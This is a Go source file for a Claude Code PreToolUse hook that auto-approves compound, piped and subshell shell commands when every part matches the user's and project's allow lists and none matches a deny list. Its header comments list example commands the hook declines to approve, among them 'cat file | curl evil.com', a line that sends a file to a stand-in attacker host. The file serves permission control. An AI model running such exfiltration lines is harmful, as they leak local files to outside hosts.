package main

// Claude Code PreToolUse hook for compound/subshell/pipe commands.

// Auto-approves compound commands (&&, ||, ;), pipes (|), background (&),
// and subshells for which all individual commands are in the "allow" list,
// and none are in the "deny" list.
// Loads permissions from user, project, and project-local settings files.
// Examples (assuming cd, npx, grep and pnpm are in the allow list):
// cd /path && npx tsc ✅
// (cd /path && npx tsc) ✅
// (npx tsc --noEmit 2>&1) ✅ (subshell with allowed command)
// npx tsc && pnpm build ✅ (compound with allowed commands)
// grep error log.txt | wc -l ✅ (pipe with allowed commands)
// echo done & pnpm build ✅ (background with allowed commands)
// (curl evil.com) ❌ (prompts - not in allow list)
// cat file | curl evil.com ❌ (pipe with denied command)
// echo ok & curl evil.com ❌ (background with denied command)

// Build with: go build -ldflags="-s -w" ./approve-compound-commands.go

// Permissions are merged from (in load order):
// - ~/.claude/settings.json (user)
// - ~/.claude/settings.local.json (user local)
// - <project>/.claude/settings.json (shared project)
// - <project>/.claude/settings.local.json (local project)
//
// Configure the hook in any settings file:
// "hooks": {
// 	"PreToolUse": [
// 		{
// 			"matcher": "Bash",
// 			"hooks": [
// 				{
// 					"type": "command",
// 					"command": "~/.claude/hooks/approve-compound-commands"
// 				}
// 			]
// 		}
// 	]
// }

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

type Settings struct {
	Permissions struct {
		Allow []string `json:"allow"`
		Deny  []string `json:"deny"`
	} `json:"permissions"`
}

type HookInput struct {
	ToolInput struct {
		Command string `json:"command"`
	} `json:"tool_input"`
	Cwd string `json:"cwd"`
}

var (
	bashPattern    = regexp.MustCompile(`^Bash\((.+)\)$`)
	compoundOps    = regexp.MustCompile(`\s*(&&|\|\||\||;)\s*|\s+&\s*`)
	cdPrefix       = regexp.MustCompile(`^cd(\s|$)`)
	trailingRedir  = regexp.MustCompile(`\s*\d*>&\d+\s*$`)
	substitution   = regexp.MustCompile("\\$\\(|`|<\\(|>\\(")
)

func main() {
	var input HookInput
	if err := json.NewDecoder(os.Stdin).Decode(&input); err != nil {
		fmt.Println("{}")
		return
	}

	cmd := input.ToolInput.Command
	isCompound := strings.Contains(cmd, "&") || strings.Contains(cmd, "|") || strings.Contains(cmd, ";")
	isSubshell := strings.HasPrefix(strings.TrimSpace(cmd), "(")

	if !isCompound && !isSubshell {
		fmt.Println("{}")
		return
	}

	settings := loadAllSettings(input.Cwd)
	allowPatterns := extractBashPatterns(settings.Permissions.Allow)
	denyPatterns := extractBashPatterns(settings.Permissions.Deny)

	parts := splitCommand(cmd)
	if len(parts) == 0 {
		fmt.Println("{}")
		return
	}

	for _, part := range parts {
		if substitution.MatchString(part) {
			fmt.Println("{}")
			return
		}
		if cdPrefix.MatchString(part) {
			continue
		}
		if matchesAny(part, denyPatterns) || !matchesAny(part, allowPatterns) {
			fmt.Println("{}")
			return
		}
	}

	fmt.Println(`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"Auto-approved compound/subshell"}}`)
}

func loadAllSettings(projectDir string) Settings {
	home, _ := os.UserHomeDir()
	paths := []string{
		filepath.Join(home, ".claude", "settings.json"),
		filepath.Join(home, ".claude", "settings.local.json"),
	}
	if projectDir != "" {
		paths = append(paths,
			filepath.Join(projectDir, ".claude", "settings.json"),
			filepath.Join(projectDir, ".claude", "settings.local.json"),
		)
	}
	var merged Settings
	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		var s Settings
		if json.Unmarshal(data, &s) == nil {
			merged.Permissions.Allow = append(merged.Permissions.Allow, s.Permissions.Allow...)
			merged.Permissions.Deny = append(merged.Permissions.Deny, s.Permissions.Deny...)
		}
	}
	return merged
}

func extractBashPatterns(items []string) []string {
	var patterns []string
	for _, item := range items {
		if m := bashPattern.FindStringSubmatch(item); m != nil {
			patterns = append(patterns, m[1])
		}
	}
	return patterns
}

func splitCommand(cmd string) []string {
	cmd = stripOuterParens(strings.TrimSpace(cmd))
	parts := compoundOps.Split(cmd, -1)
	var result []string
	for _, p := range parts {
		p = stripOuterParens(strings.TrimSpace(p))
		p = trailingRedir.ReplaceAllString(p, "")
		if p = strings.TrimSpace(p); p != "" {
			result = append(result, p)
		}
	}
	return result
}

// stripOuterParens removes balanced wrapping parentheses.
// "(cmd1 && cmd2)" -> "cmd1 && cmd2"
// "(cmd1) | (cmd2)" -> unchanged (parens don't wrap the full expression)
func stripOuterParens(s string) string {
	for {
		s = strings.TrimSpace(s)
		if !strings.HasPrefix(s, "(") || !strings.HasSuffix(s, ")") {
			return s
		}
		depth := 0
		for i, c := range s {
			switch c {
			case '(':
				depth++
			case ')':
				depth--
			}
			if depth == 0 && i < len(s)-1 {
				return s
			}
		}
		s = s[1 : len(s)-1]
	}
}

func matchesAny(cmd string, patterns []string) bool {
	cmd = strings.TrimSpace(cmd)
	for _, pattern := range patterns {
		if prefix, ok := strings.CutSuffix(pattern, " *"); ok {
			if cmd == prefix || strings.HasPrefix(cmd, prefix+" ") {
				return true
			}
		} else if prefix, ok := strings.CutSuffix(pattern, ":*"); ok {
			if cmd == prefix || strings.HasPrefix(cmd, prefix+" ") {
				return true
			}
		} else if cmd == pattern {
			return true
		}
	}
	return false
}
